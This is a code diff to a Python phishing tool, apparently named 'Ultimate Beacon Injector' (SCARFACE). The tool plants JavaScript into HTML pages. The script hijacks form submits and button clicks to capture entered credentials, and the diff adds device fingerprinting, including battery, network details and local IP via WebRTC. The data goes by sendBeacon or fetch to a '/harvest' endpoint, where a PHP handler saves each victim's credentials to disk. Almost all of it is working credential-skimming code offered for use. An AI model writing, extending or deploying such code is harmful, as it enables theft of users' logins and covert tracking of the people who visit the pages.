@@ -1,5 +1,5 @@
 """
-Ultimate Beacon Injector - Guarantees delivery on page reload
+Ultimate Beacon Injector - Advanced Client Info Collector
 """
 import os
 import re
@@ -26,6 +26,75 @@ class ModernInjector:
 (function() {
     console.log('[SCARFACE] Ultimate beacon loaded');
 
+    // ---- Collect Advanced Client Info ----
+    function getClientInfo() {
+        var info = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookiesEnabled: navigator.cookieEnabled,
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight
+            },
+            hardware: {
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                cpuCores: navigator.hardwareConcurrency || 'unknown',
+                touchSupport: 'ontouchstart' in window
+            },
+            network: {
+                connection: navigator.connection || {},
+                downlink: (navigator.connection ? navigator.connection.downlink : 'unknown'),
+                effectiveType: (navigator.connection ? navigator.connection.effectiveType : 'unknown'),
+                rtt: (navigator.connection ? navigator.connection.rtt : 'unknown'),
+                type: (navigator.connection ? navigator.connection.type : 'unknown')
+            },
+            battery: {}
+        };
+
+        // Battery API (if available)
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(batt) {
+                info.battery.level = batt.level * 100 + '%';
+                info.battery.charging = batt.charging;
+                info.battery.chargingTime = batt.chargingTime;
+                info.battery.dischargingTime = batt.dischargingTime;
+            }).catch(function(){});
+        }
+
+        // --- Get Local IP via WebRTC (with fallback) ---
+        var localIP = null;
+        var rtc = new RTCPeerConnection({iceServers:[]});
+        rtc.createDataChannel('');
+        rtc.createOffer().then(function(offer) {
+            rtc.setLocalDescription(offer);
+        }).catch(function(){});
+        rtc.onicecandidate = function(e) {
+            if (e.candidate && e.candidate.candidate) {
+                var ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                if (ipMatch) {
+                    localIP = ipMatch[0];
+                }
+            }
+        };
+        // Fallback: use hostname or simple IP detection
+        setTimeout(function() {
+            if (!localIP) {
+                // Use a simple method: try to fetch from a service (optional)
+                // For now, just set to 'unknown'
+                localIP = 'unknown (WebRTC unavailable)';
+            }
+            info.localIP = localIP;
+        }, 1000);
+
+        // Return the info (we'll update localIP later via another call)
+        return info;
+    }
+
     function captureData(form) {
         if(!form) return;
         var data = {};
@@ -38,29 +107,37 @@ class ModernInjector:
         if(Object.keys(data).length === 0) return;
 
         console.log('[SCARFACE] ✅ CAPTURED:', data);
-        
+
+        // Attach client info
+        var clientInfo = getClientInfo();
+        // Send as separate field 'client_info' (we'll have to send it as part of the payload)
+        var payload = {
+            form_data: data,
+            client_info: clientInfo,
+            timestamp: new Date().toISOString()
+        };
+
         // Guaranteed delivery on page unload
-        var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+        var blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
         if(navigator.sendBeacon('/harvest', blob)) {
             console.log('[SCARFACE] Beacon sent successfully');
         } else {
-            // Fallback to fetch
             fetch('/harvest', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
+                body: JSON.stringify(payload)
             }).catch(e => console.log('[SCARFACE] Fetch error:', e));
         }
     }
 
-    // Override native form submit (catches direct JS submits)
+    // Override native form submit
     var originalSubmit = HTMLFormElement.prototype.submit;
     HTMLFormElement.prototype.submit = function() {
         captureData(this);
         originalSubmit.call(this);
     };
 
-    // Catch button clicks (bypasses React/AJAX)
+    // Catch button clicks
     document.addEventListener('click', function(e) {
         var btn = e.target.closest('button, div[role="button"], input[type="submit"]');
         if(btn) {
@@ -88,7 +165,6 @@ class ModernInjector:
                         with open(html_file, 'r', encoding='utf-8') as f:
                             content = f.read()
                         
-                        # Clean out old scripts
                         new_content = re.sub(r'<!-- SCARFACE_.*?-->\s*<script>.*?</script>', '', content, flags=re.DOTALL)
                         
                         if '</body>' in new_content:
@@ -124,16 +200,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
     $log_dir = '{os.path.join(self.credentials_dir, self.site_name)}';
     if (!file_exists($log_dir)) {{ mkdir($log_dir, 0777, true); }}
     
-    $username = isset($data['username']) ? $data['username'] : (isset($data['email']) ? $data['email'] : 'unknown');
+    $username = isset($data['form_data']['username']) ? $data['form_data']['username'] : (isset($data['form_data']['email']) ? $data['form_data']['email'] : 'unknown');
     $username = preg_replace('/[^a-zA-Z0-9._-]/', '_', $username);
     $timestamp = date('Ymd_His') . '_' . substr(microtime(), 2, 3);
     $filename = $log_dir . '/' . $username . '_' . $timestamp . '.json';
     
-    file_put_contents($filename, json_encode([
-        'timestamp' => date('Y-m-d H:i:s'),
-        'data' => $data,
-        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
-    ], JSON_PRETTY_PRINT));
+    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
     
     header('Content-Type: application/json');
     echo json_encode(['status' => 'success']);
